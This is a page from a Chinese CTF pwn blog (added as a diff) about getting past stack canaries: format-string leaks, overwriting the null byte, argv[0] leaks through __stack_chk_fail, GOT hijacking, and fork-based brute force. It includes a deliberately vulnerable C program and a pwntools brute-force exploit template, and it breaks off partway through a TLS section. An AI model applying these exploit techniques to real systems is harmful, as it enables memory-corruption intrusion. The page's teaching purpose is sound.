@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="canary的各种绕过技巧前几天又被canary给恶心了，以前一直用格式化字符串漏洞和一些输出函数来泄露canary，这一回啥也没有，给我搞麻了 回头想来，我好像就只会这两种canary的泄露方法，于是我打算学一学获取canary的技巧  canary原理12v4 &#x3D; __readfsqword(0x28u);return __readfsqword(0x28u) ^ v4; 有时候我们会在IDA">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn穿canary">
+<meta property="og:url" content="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="canary的各种绕过技巧前几天又被canary给恶心了，以前一直用格式化字符串漏洞和一些输出函数来泄露canary，这一回啥也没有，给我搞麻了 回头想来，我好像就只会这两种canary的泄露方法，于是我打算学一学获取canary的技巧  canary原理12v4 &#x3D; __readfsqword(0x28u);return __readfsqword(0x28u) ^ v4; 有时候我们会在IDA">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/1641023789366-1643270848456.png">
+<meta property="og:image" content="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/1641027667797-1643270848457.png">
+<meta property="article:published_time" content="2022-01-04T14:35:10.000Z">
+<meta property="article:modified_time" content="2022-03-16T10:48:35.685Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="miscellaneous">
+<meta property="article:tag" content="canary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/1641023789366-1643270848456.png">
+
+<link rel="canonical" href="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>pwn穿canary | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/04/pwn%E7%A9%BFcanary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn穿canary
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-01-04 22:35:10" itemprop="dateCreated datePublished" datetime="2022-01-04T22:35:10+08:00">2022-01-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-16 18:48:35" itemprop="dateModified" datetime="2022-03-16T18:48:35+08:00">2022-03-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>6.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>6 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="canary的各种绕过技巧"><a href="#canary的各种绕过技巧" class="headerlink" title="canary的各种绕过技巧"></a>canary的各种绕过技巧</h2><p>前几天又被canary给恶心了，以前一直用格式化字符串漏洞和一些输出函数来泄露canary，这一回啥也没有，给我搞麻了</p>
+<p>回头想来，我好像就只会这两种canary的泄露方法，于是我打算学一学获取canary的技巧</p>
+<hr>
+<h2 id="canary原理"><a href="#canary原理" class="headerlink" title="canary原理"></a>canary原理</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br></pre></td></tr></table></figure>
+<p>有时候我们会在IDA中看见这两个东西，这就是canary的生成代码</p>
+<p>在函数开始，fs:0x28 的值被存储在 ebp - 0xc，在函数返回之前对 ebp - 0xc处的值进行检查，如果和 fs:0x28 不一样，说明发生了溢出，紧接着执行__stack_chk_fail_local 并退出进程 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004007F</span>3                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000000004007F</span>C                 mov     [rsp+<span class="number">128</span>h+var_20], rax</span><br><span class="line">.text:<span class="number">0000000000400804</span>                 <span class="keyword">xor</span>     eax, eax</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400882</span>                 mov     rax, [rsp+<span class="number">128</span>h+var_20]</span><br><span class="line">.text:<span class="number">000000000040088</span>A                 <span class="keyword">xor</span>     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000000400893</span>                 jnz     <span class="keyword">short</span> loc_4008A9</span><br><span class="line">    --------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004008</span>A9 loc_4008A9:         </span><br><span class="line">.text:<span class="number">00000000004008</span>A9                 call    ___stack_chk_fail</span><br></pre></td></tr></table></figure>
+<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641023789366-1643270848456.png" class width="1641023789366"> 
+<p>​        //这个图的上面是高地址，下面是低地址</p>
+<p>那么，fs:0x28 中的值是怎么生成的呢？</p>
+<p>事实上，TLS 中的值由函数 security_init 进行初始化 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">security_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line"><span class="meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span></span><br></pre></td></tr></table></figure>
+<p><strong>在gcc中使用canary：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>这个可以说是经典了，找一找偏移用“%p”一下子就搞出来了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa\n&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf28</span> --&gt; <span class="number">0xa</span> (<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="number">10016</span>| <span class="number">0x7fffffffdf30</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10024</span>| <span class="number">0x7fffffffdf38</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10032</span>| <span class="number">0x7fffffffdf40</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdf48</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdf50</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10056</span>| <span class="number">0x7fffffffdf58</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10064</span>| <span class="number">0x7fffffffdf60</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10072</span>| <span class="number">0x7fffffffdf68</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10080</span>| <span class="number">0x7fffffffdf70</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10088</span>| <span class="number">0x7fffffffdf78</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10096</span>| <span class="number">0x7fffffffdf80</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10104</span>| <span class="number">0x7fffffffdf88</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10112</span>| <span class="number">0x7fffffffdf90</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10120</span>| <span class="number">0x7fffffffdf98</span> --&gt; <span class="number">0x0</span> </span><br><span class="line"><span class="number">10128</span>| <span class="number">0x7fffffffdfa0</span> --&gt; <span class="number">0x400a50</span> (push   r15)</span><br><span class="line"><span class="number">10136</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d00</span>            <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10144</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10152</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10160</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
+<p>可以计算出偏移为“17”</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">formats(<span class="string">&quot;%23$p&quot;</span>)     <span class="comment">#这是64位系统 17+6=23</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)    <span class="comment">#用prinft打印的canary以‘0x’开头</span></span><br><span class="line">canary = <span class="built_in">eval</span>(<span class="string">b&#x27;0x&#x27;</span>+p.recv(<span class="number">16</span>))		<span class="comment">#canary有8个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br></pre></td></tr></table></figure>
+<p>​        //通常把gdb和终端结合起来看效果更好</p>
+<h2 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h2><p>canary设计为以字节“\x00”结尾，而输出函数会被“\x00”中断，如果把“\x00”给覆盖了就可以利用输出函数来泄露canary</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10000</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>)      <span class="comment">#printf第一个参数的地址</span></span><br><span class="line"><span class="number">10008</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10018</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10020</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10028</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10030</span>| <span class="number">0x7fffffffdf20</span> (<span class="string">&quot;aaaaaaaa&quot;</span>) </span><br><span class="line"><span class="number">10038</span>| <span class="number">0x7fffffffdfa8</span> --&gt; <span class="number">0x7ce1a471e5f87d</span>+<span class="string">&#x27;\n&#x27;</span>         <span class="comment">#金丝雀巢穴</span></span><br><span class="line"><span class="number">10040</span>| <span class="number">0x7fffffffdfb0</span> --&gt; <span class="number">0x7fffffffdff0</span> --&gt; <span class="number">0x0</span>        <span class="comment">#上一个函数的ebp</span></span><br><span class="line"><span class="number">10048</span>| <span class="number">0x7fffffffdfb8</span> --&gt; <span class="number">0x4008b8</span> (jmp    <span class="number">0x4008d8</span>)    <span class="comment">#返回地址</span></span><br><span class="line"><span class="number">10050</span>| <span class="number">0x7fffffffdfc0</span> --&gt; <span class="number">0x7ffff7fb2fc8</span> --&gt; <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
+<p>这样canary结尾的“\x00”就被替换为了“\n”，后续的read函数就可以成功泄露canary</p>
+<h2 id="利用stack-chk-fail的报错信息"><a href="#利用stack-chk-fail的报错信息" class="headerlink" title="利用stack_chk_fail的报错信息"></a>利用stack_chk_fail的报错信息</h2><p>前面两个都是常规的，这个就不一样了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">[<span class="number">1</span>]    <span class="number">3005</span> abort (core dumped)  ./newbie</span><br></pre></td></tr></table></figure>
+<p>当canary被覆盖时，程序会进行上述报错</p>
+<p>打印这些字符串的函数是“stack_chk_fail.c”：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;debug/fortify_fail.c&quot;</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (msg)</span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">char</span> *msg;</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line"> __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line"> msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>
+<p>可以发现canary触发时会打印 “libc_argv[0]”，如果栈溢出覆盖了 “libc_argv[0]”，那么程序就会打印覆盖的内容</p>
+<img src="/2022/01/04/pwn%E7%A9%BFcanary/1641027667797-1643270848457.png" class width="1641027667797">  
+<p>​        // libc_argv[0]装有<strong>指向程序地址</strong>的指针</p>
+<p>这种操作只能泄露指针的内容，并且需要目标指针的地址来覆盖 “libc_argv[0]” ，所以“libc_argv[0]” 相当于输入值的偏移也需要掌握</p>
+<p>​        // 如果存在“fork”，还可以利用这种方式来打印“libc_base”</p>
+<h2 id="stack-chk-fail劫持"><a href="#stack-chk-fail劫持" class="headerlink" title="stack_chk_fail劫持"></a>stack_chk_fail劫持</h2><p>canary报错时会调用 <strong>_stack_chk_fail</strong> ，那么劫持 <strong>_stack_chk_fail</strong> 当然也是一种攻击手段</p>
+<p>这个一般通过GOT表劫持该函数，所以不能开启 <strong>Full RELRO</strong> 保护</p>
+<p>像printf格式化漏洞WAA，或者堆溢出WAA，都可以改写GOT表内容，甚至配合UAF和数组越位也可以改写GOT表（如果合适的话）</p>
+<h2 id="one-by-one爆破"><a href="#one-by-one爆破" class="headerlink" title="one-by-one爆破"></a>one-by-one爆破</h2><p>一般来说，爆破canary是很蠢的事情，因为每次运行程序canary都会改变</p>
+<p>但是存在一类通过fork函数开启子进程交互的题目，fork函数会直接拷贝父进程的内存，因此每次创建的子进程的canary是相同的 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getflag</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    fgets(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		pid = fork();		<span class="comment">//fork开启子进程</span></span><br><span class="line">		<span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">			fun();</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			wait(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line">padding = <span class="string">&#x27;a&#x27;</span>*<span class="number">100</span></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>): </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send( padding + canary + <span class="built_in">chr</span>(i)) </span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;recv&#x27;</span> <span class="keyword">in</span> a:	</span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(<span class="number">0x0804864d</span>))</span><br><span class="line"></span><br><span class="line">flag = cn.recv()</span><br><span class="line">cn.close()</span><br><span class="line">log.success(<span class="string">&#x27;flag is:&#x27;</span> + flag)</span><br><span class="line"><span class="comment">#32位为‘3’,64位为‘7’</span></span><br></pre></td></tr></table></figure>
+<p>这个模板可以说是经典了，遇到此类题目后改一改就好了</p>
+<h2 id="覆盖TLS中储存的canary值"><a href="#覆盖TLS中储存的canary值" class="headerlink" title="覆盖TLS中储存的canary值"></a>覆盖TLS中储存的canary值</h2><p>canary的值存储在fs:[0x28]中</p>
+<p>fs寄存器是由glibc定义的，存放Thread Local Storage （TLS）信息</p>
+<p>该结构体如下所示：</p>
